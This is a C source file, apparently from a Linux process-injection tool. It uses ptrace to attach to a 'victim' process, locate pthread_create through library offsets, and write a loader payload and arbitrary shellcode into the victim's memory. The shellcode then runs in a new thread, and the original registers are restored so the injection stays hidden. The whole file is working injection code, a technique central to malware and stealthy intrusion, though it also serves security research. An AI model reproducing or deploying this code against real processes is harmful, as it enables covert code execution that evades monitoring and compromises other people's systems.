#include "inject_shellcode_new_pthread.h"

#define LIBC "libc-"
#define PTHREAD "pthread"

long get_malloc_addr_in_victim(pid_t victim){
  int mypid = getpid();
  long mylibcaddr = getlibaddr(mypid, (char*)&LIBC);
  long mallocAddr = getFunctionAddress("malloc", (char*)&"libc.so.6");
  long mallocOffset = mallocAddr - mylibcaddr;
  long targetLibcAddr = getlibaddr(victim, (char*)&LIBC);
  long targetMallocAddr = targetLibcAddr + mallocOffset;
  return targetMallocAddr;
}

long get_pthread_create_addr_in_victim(pid_t victim){
  int my_pid = getpid();
  long my_pthread_addr = getlibaddr(my_pid, (char*)&PTHREAD);
  long my_pthread_create_addr = getFunctionAddress("pthread_create", (char*)&"libpthread.so.0");
  long pthread_create_offset = my_pthread_create_addr - my_pthread_addr;
  long victim_pthread_addr = getlibaddr(victim, (char*)&PTHREAD);
  long victim_pthread_create_addr = victim_pthread_addr + pthread_create_offset;
  return victim_pthread_create_addr;
}

void inject_shellcode_new_pthread(pid_t target, char* path_to_shellcode){

  dzlog_info("Loading shellcode from %s", path_to_shellcode);
  int size_of_shellcode = 0;
  char* shellcode = read_file(path_to_shellcode, &size_of_shellcode);

  int size_of_pthread_payload = 0;
  char* pthread_payload = read_file("/home/max/code/linux-inject/payloads/pthread_payload.bin", &size_of_pthread_payload);
  long victim_pthread_create_addr = get_pthread_create_addr_in_victim(target);

  dzlog_info("libpthread's pthread create located at 0x%lx", victim_pthread_create_addr); 

  struct user_regs_struct oldregs, regs;
  memset(&oldregs, 0, sizeof(struct user_regs_struct));
  memset(&regs, 0, sizeof(struct user_regs_struct));
	
  ptrace_attach(target);

  ptrace_getregs(target, &oldregs);
  memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));

  long addr = freespaceaddr(target) + sizeof(long);
  regs.rip = addr + 2;

  // pass arguments to initial shellcode via registers
  //regs.rdi = targetMallocAddr;
  //regs.rsi = size_of_shellcode;
  ptrace_setregs(target, &regs);

  // back up whatever data used to be at the address we want to modify
  // write shellcode to this address and run process
  char* backup = malloc(size_of_pthread_payload);
  ptrace_read(target, addr, backup, size_of_pthread_payload);
  ptrace_write(target, addr, pthread_payload, size_of_pthread_payload);	
  ptrace_cont(target);

  // write payload to victim and run pthread_create 
  struct user_regs_struct pthread_regs;
  memset(&pthread_regs, 0, sizeof(struct user_regs_struct));
  ptrace_getregs(target, &pthread_regs);
  pthread_regs.r11 = victim_pthread_create_addr;
  unsigned long long shellcode_buf = pthread_regs.rdx;
  ptrace_setregs(target, &regs);
  ptrace_write(target, shellcode_buf, shellcode, size_of_shellcode);
  dzlog_info("Calling pthread_create: rdi 0x%llx, rsi 0x%llx, rdx 0x%llx, rcx 0x%llx, r11 0x%llx, rax 0x%llx", pthread_regs.rdi,
	     pthread_regs.rsi, pthread_regs.rdx, pthread_regs.rcx, pthread_regs.r11, pthread_regs.rax);
  ptrace_cont(target);

  memset(&pthread_regs, 0, sizeof(struct user_regs_struct));
  ptrace_getregs(target, &pthread_regs);
  dzlog_info("After pthread_create: rax 0x%llx", pthread_regs.rax);
  
  restoreStateAndDetach(target, addr, backup, size_of_pthread_payload, oldregs);
  free(backup);
  free(shellcode);

  dzlog_info("Finished injection of shellcode. It runs with its own thread now.");
}
